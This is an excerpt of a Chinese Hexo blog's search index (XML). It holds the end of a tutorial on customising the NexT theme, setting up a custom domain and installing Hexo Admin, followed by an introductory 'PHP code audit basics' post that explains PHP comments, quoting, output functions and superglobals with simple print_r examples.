&#125;&#125;字&lt;/span&gt;&lt;/div&gt; 修改文章底部的带#号的标签修改hexo\themes\next\layout_macro\post.swig文件，搜索rel=&quot;tag&quot;&gt;# ，改为&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; 在每篇文章末尾统一添加“本文结束”标记在hexo\themes\next\layout_macro目录下，新建passage-end-tag.swig ，并添加如下内容 12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 接着打开hexo\themes\next\layout_macro\post.swig文件，在post-body 之后添加 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include &apos;passage-end-tag.swig&apos; %&#125; &#123;% endif %&#125;&lt;/div&gt; 打开主题配置文件，在末尾添加 123# 文章末尾添加“本文结束”标记passage_end_tag: enabled: true 0x010 访问线上博客执行hexo cleanhexo ghexo d浏览器访问https://yourname.github.io （yourname是你的github用户名） 设置域名解析ping一下你的博客域名，获取其IP地址 在阿里云或腾讯云设置域名解析 在Hexo目录下的source中建一个CNAME命名的文件夹(切记没有后缀) 右键新建txt文本-&gt;输入你购买的域名www.ainusers.top-&gt;保存关闭 然后快捷键F2或者右键该文本重命名-&gt;将.txt后缀去掉-&gt;会提示文件不可用继续确定即可 上传进入hexo目录 hexo cleanhexo ghexo d即可使用自定义域名访问博客，并且原博客域名也不会失效 Hexo Admin后台管理博客工具使用hexo+github确实非常方便管理自己的知识，但是缺点在于每次在本地使用markdown工具写完笔记，都要进行生成静态页面，然后本地预览或者上传github操作，操作非常繁琐。所以在这里配置使用Hexo Admin工具对博客进行管理，简化操作。 Hexo Admin介绍官方网站：https://jaredforsyth.com/hexo-admin/属于hexo插件系列，使用B/S架构对博客进行后台管理 安装进入/hexo目录git bash下1npm install --save hexo-admin 访问hexo后台管理界面git bash下1hexo server -d 访问http://localhost:4000/即可访问本地博客 访问http://localhost:4000/admin即可进入Hexo Admin后台管理界面 配置Hexo AdminSettings选项下 点击Setup authentification here 配置你的Hexo Admin登陆账户及密码，以及加密cookies的字符串 下方会生成配置文件字段，将此复制到站点目录下_config.yml中 重启hexo server -d，再次访问http://localhost:4000/admin则需输入账号密码登陆。 参考连接https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.htmlhttp://theme-next.iissnan.com/getting-started.htmlhttp://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.htmlhttps://www.cnblogs.com/syd192/p/6074323.html https://blog.csdn.net/ainuser/article/details/77609180]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP代码审计 基础知识]]></title>
    <url>%2F2018%2F08%2F08%2FPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[本文记录 PHP 代码审计的学习过程 PHP 代码审计博客目录 1. 环境准备1.1 测试运行环境安装 wamp 1.2 PHP 编写工具 EditPlu Notepad++ Zendstudio 10 百度云下载链接 1.3 代码审计工具Seay源代码审计系统 百度云下载链接 1.4 代码审计平台 DVWA GitHub 链接 ZVulDrill GitHub 链接 2. 注释 单行注释 =&gt; //单行注释 多行注释 =&gt; /*多行注释*/ 3. 单引号和双引号 单引号不解析变量 双引号解析变量 aaa=’123’ echo &apos;$aaa&apos; =&gt; 结果为 $aaa echo &quot;$aaa&quot; =&gt; 结果为 123 4. 输出函数 echo 或者 print：最简单的输出方法 print_r、var_dump(var_export)、debug_zval_dump：输出变量数据值，特别是数组和对象数据 var_dump 会额外输出数据类型 print_r：输出格式很整齐，跟var_dump 的区别是没有类型数据，并且布尔值的 false 和 NULL 输出为空 var_export：所有的数据是可以作为组织好的变量输出的，都是能够作为直接赋值使用；需要注意的一点是, var_export 对于资源型的变量会输出NULL debug_zval_dump：输出结果跟 var_dump 类似，唯一增加的一个值是 refcount，就是记录一个变量被引用了多少次，这是 php 的copy on write (写时复制) 的机制的一个重要特点。 5. 超全局变量1超全局变量——超全局变量是在全部作用域中始终可用的内置变量 1. 简介 在php 中可由用户操作的全局变量列表如下: $GLOBALS — 引用全局作用域中可用的全部变量 $_SERVER — 服务器和执行环境信息 $_GET — HTTP GET 变量 $_POST — HTTP POST 变量 $_FILES — HTTP 文件上传变量 $_REQUEST — HTTP Request 变量 $_SESSION — Session 变量 $_ENV — 环境变量 $_COOKIE — HTTP Cookies 已经被弃用的超全局变量 $_HTTP_COOKIE_VARS $_HTTP_ENV_VARS $_HTTP_GET_VARS $_HTTP_POST_FILES $_HTTP_POST_VARS $_HTTP_SERVER_VARS 2. 超全局变量示例 $GLOBALS 例一：1234567891011121314151617&lt;?php$moon=&quot;1&quot;;echo $GLOBALS[&apos;moon&apos;];?&gt;# 显示结果为1# 例二&lt;?phpfunction test()&#123; echo $moon=&quot;2&quot;; echo $GLOBALS[&apos;moon&apos;];&#125;$moon=&quot;1&quot;;test();?&gt;# 显示结果为 21 # 函数内部为局部变量，不被 $GLOBALS 所识别 $_SERVER test1.php &lt;?php print_r($_SERVER); ?&gt; 12345test2.php &lt;?php $_SERVER=&apos;aaaaaa&apos;; print_r($_SERVER); ?&gt; 输出结果为服务器的配置信息 输出结果可以被覆盖 $_GET test.php &lt;?php print_r($_GET); ?&gt; 输出结果为 URL 中的 GET 变量的数据 $_POST test.php &lt;?php print_r($_POST); ?&gt; 输出结果为 URL 中的 POET 变量的数据 $_FILES file.html&lt;lable for=&quot;file&quot;&gt;Filename:&lt;/lable&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/form&gt; test.php&lt;?phpprint_r($_FILES);?&gt; 输出结果为提交的文件的信息 $_REQUEST 1234567891011121314 test1.php &lt;?php print_r($_REQUEST); ?&gt; test2.php &lt;?php $_REQUEST=&apos;aaaaaa&apos;; print_r($_REQUEST); ?&gt;输出结果可以被覆盖![](https://i.imgur.com/W6GgqVz.png) $_SESSION test1.php &lt;?php print_r($_SESSION); ?&gt; 12345test2.php &lt;?php $_SESSION=&apos;aaaaaa&apos;; print_r($_SESSION); ?&gt; 输出结果可以被覆盖 $_ENV test1.php &lt;?php print_r($_ENV); ?&gt; 12345678910test2.php &lt;?php $_ENV=&apos;aaaaaa&apos;; print_r($_ENV); ?&gt;test3.php &lt;?php print_r($_ENV[&apos;OS&apos;]=&apos;bbbbbb&apos;); ?&gt; 输出结果可以被覆盖 $_COOKIE test.php &lt;?php print_r($_COOKIE); ?&gt; 输出结果为 cookie 值]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
</search>
